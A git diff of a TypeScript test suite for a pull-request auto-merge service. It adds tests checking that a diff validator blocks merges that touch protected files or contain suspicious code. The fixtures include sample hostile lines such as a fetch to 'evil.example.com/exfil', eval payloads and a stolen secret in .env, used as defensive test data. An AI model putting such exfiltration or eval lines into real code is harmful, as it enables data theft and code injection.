@@ -112,7 +112,7 @@ describe('AutoMergeService.checkAll', () => {
         expect(called).toBe(false);
     });
 
-    test('merges PR when all checks pass', async () => {
+    test('merges PR when all checks pass and diff is clean', async () => {
         insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');
 
         const calls: string[][] = [];
@@ -131,6 +131,10 @@ describe('AutoMergeService.checkAll', () => {
             if (key.includes('pr checks')) {
                 return { ok: true, stdout: 'pass', stderr: '' };
             }
+            if (key.includes('repos/') && key.includes('/pulls/')) {
+                // Diff validation — return a clean diff
+                return { ok: true, stdout: '+++ b/server/routes/health.ts\n+// safe change', stderr: '' };
+            }
             if (key.includes('pr merge')) {
                 return { ok: true, stdout: 'Merged', stderr: '' };
             }
@@ -141,10 +145,10 @@ describe('AutoMergeService.checkAll', () => {
         (service as any).running = true;
         await service.checkAll();
 
-        // Should have made: search, checks, merge
-        expect(calls.length).toBe(3);
-        expect(calls[2].join(' ')).toContain('pr merge');
-        expect(calls[2].join(' ')).toContain('--squash');
+        // Should have made: search, checks, diff validation, merge
+        expect(calls.length).toBe(4);
+        expect(calls[3].join(' ')).toContain('pr merge');
+        expect(calls[3].join(' ')).toContain('--squash');
     });
 
     test('skips PR when checks fail', async () => {
@@ -262,6 +266,9 @@ describe('AutoMergeService.checkAll', () => {
             if (key.includes('pr checks')) {
                 return { ok: true, stdout: 'pass', stderr: '' };
             }
+            if (key.includes('repos/') && key.includes('/pulls/')) {
+                return { ok: true, stdout: '+++ b/server/routes/health.ts\n+// safe', stderr: '' };
+            }
             if (key.includes('pr merge')) {
                 return { ok: false, stdout: '', stderr: 'merge conflict' };
             }
@@ -285,5 +292,222 @@ describe('AutoMergeService.checkAll', () => {
         (service as any).running = true;
         // Should not throw
         await service.checkAll();
+    });
+
+    test('blocks merge when diff modifies protected files', async () => {
+        insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');
+
+        const calls: string[][] = [];
+        const runGh: RunGhFn = async (args) => {
+            calls.push(args);
+            const key = args.join(' ');
+            if (key.includes('search/issues')) {
+                return {
+                    ok: true,
+                    stdout: JSON.stringify({
+                        items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
+                    }),
+                    stderr: '',
+                };
+            }
+            if (key.includes('pr checks')) {
+                return { ok: true, stdout: 'pass', stderr: '' };
+            }
+            if (key.includes('repos/') && key.includes('/pulls/')) {
+                // Diff that modifies a protected file
+                return { ok: true, stdout: '+++ b/server/db/schema.ts\n+// malicious change', stderr: '' };
+            }
+            if (key.includes('pr comment')) {
+                return { ok: true, stdout: '', stderr: '' };
+            }
+            return { ok: false, stdout: '', stderr: '' };
+        };
+
+        const service = new AutoMergeService(db, runGh);
+        (service as any).running = true;
+        await service.checkAll();
+
+        // Should NOT have merged — should have commented instead
+        const mergeCall = calls.find((c) => c.join(' ').includes('pr merge'));
+        expect(mergeCall).toBeUndefined();
+        const commentCall = calls.find((c) => c.join(' ').includes('pr comment'));
+        expect(commentCall).toBeDefined();
+    });
+
+    test('blocks merge when diff has unapproved external fetches', async () => {
+        insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');
+
+        const calls: string[][] = [];
+        const runGh: RunGhFn = async (args) => {
+            calls.push(args);
+            const key = args.join(' ');
+            if (key.includes('search/issues')) {
+                return {
+                    ok: true,
+                    stdout: JSON.stringify({
+                        items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
+                    }),
+                    stderr: '',
+                };
+            }
+            if (key.includes('pr checks')) {
+                return { ok: true, stdout: 'pass', stderr: '' };
+            }
+            if (key.includes('repos/') && key.includes('/pulls/')) {
+                return {
+                    ok: true,
+                    stdout: '+++ b/server/routes/new.ts\n+const r = await fetch("https://evil.example.com/exfil")',
+                    stderr: '',
+                };
+            }
+            if (key.includes('pr comment')) {
+                return { ok: true, stdout: '', stderr: '' };
+            }
+            return { ok: false, stdout: '', stderr: '' };
+        };
+
+        const service = new AutoMergeService(db, runGh);
+        (service as any).running = true;
+        await service.checkAll();
+
+        const mergeCall = calls.find((c) => c.join(' ').includes('pr merge'));
+        expect(mergeCall).toBeUndefined();
+    });
+
+    test('blocks merge when diff has malicious code patterns', async () => {
+        insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');
+
+        const calls: string[][] = [];
+        const runGh: RunGhFn = async (args) => {
+            calls.push(args);
+            const key = args.join(' ');
+            if (key.includes('search/issues')) {
+                return {
+                    ok: true,
+                    stdout: JSON.stringify({
+                        items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
+                    }),
+                    stderr: '',
+                };
+            }
+            if (key.includes('pr checks')) {
+                return { ok: true, stdout: 'pass', stderr: '' };
+            }
+            if (key.includes('repos/') && key.includes('/pulls/')) {
+                return {
+                    ok: true,
+                    stdout: '+++ b/server/routes/new.ts\n+eval("malicious code")',
+                    stderr: '',
+                };
+            }
+            if (key.includes('pr comment')) {
+                return { ok: true, stdout: '', stderr: '' };
+            }
+            return { ok: false, stdout: '', stderr: '' };
+        };
+
+        const service = new AutoMergeService(db, runGh);
+        (service as any).running = true;
+        await service.checkAll();
+
+        const mergeCall = calls.find((c) => c.join(' ').includes('pr merge'));
+        expect(mergeCall).toBeUndefined();
+    });
+});
+
+// ── validateDiff unit tests ──────────────────────────────────────────
+
+describe('AutoMergeService.validateDiff', () => {
+    test('returns null for clean diff', async () => {
+        const runGh: RunGhFn = async () => ({
+            ok: true,
+            stdout: '+++ b/server/routes/health.ts\n+export function check() { return true; }',
+            stderr: '',
+        });
+
+        const service = new AutoMergeService(db, runGh);
+        const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
+        expect(result).toBeNull();
+    });
+
+    test('rejects diff modifying package.json', async () => {
+        const runGh: RunGhFn = async () => ({
+            ok: true,
+            stdout: '+++ b/package.json\n+"evil": "dependency"',
+            stderr: '',
+        });
+
+        const service = new AutoMergeService(db, runGh);
+        const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
+        expect(result).toContain('Protected files modified');
+        expect(result).toContain('package.json');
+    });
+
+    test('rejects diff modifying .env', async () => {
+        const runGh: RunGhFn = async () => ({
+            ok: true,
+            stdout: '+++ b/.env\n+SECRET_KEY=stolen',
+            stderr: '',
+        });
+
+        const service = new AutoMergeService(db, runGh);
+        const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
+        expect(result).toContain('Protected files modified');
+    });
+
+    test('rejects diff with eval()', async () => {
+        const runGh: RunGhFn = async () => ({
+            ok: true,
+            stdout: '+++ b/server/routes/new.ts\n+eval("payload")',
+            stderr: '',
+        });
+
+        const service = new AutoMergeService(db, runGh);
+        const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
+        expect(result).toContain('Suspicious code patterns');
+    });
+
+    test('rejects diff with unapproved fetch domain', async () => {
+        const runGh: RunGhFn = async () => ({
+            ok: true,
+            stdout: '+++ b/server/routes/new.ts\n+await fetch("https://evil.example.com/exfil")',
+            stderr: '',
+        });
+
+        const service = new AutoMergeService(db, runGh);
+        const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
+        expect(result).toContain('Unapproved external domains');
+    });
+
+    test('returns error when diff cannot be fetched', async () => {
+        const runGh: RunGhFn = async () => ({
+            ok: false,
+            stdout: '',
+            stderr: 'API error',
+        });
+
+        const service = new AutoMergeService(db, runGh);
+        const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
+        expect(result).toContain('Could not retrieve PR diff');
+    });
+
+    test('catches multiple issues in one diff', async () => {
+        const runGh: RunGhFn = async () => ({
+            ok: true,
+            stdout: [
+                '+++ b/server/db/schema.ts',
+                '+// modified protected file',
+                '+++ b/server/routes/bad.ts',
+                '+eval("payload")',
+                '+await fetch("https://evil.example.com/exfil")',
+            ].join('\n'),
+            stderr: '',
+        });
+
+        const service = new AutoMergeService(db, runGh);
+        const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
+        expect(result).toContain('Protected files modified');
+        expect(result).toContain('Suspicious code patterns');
+        expect(result).toContain('Unapproved external domains');
     });
 });
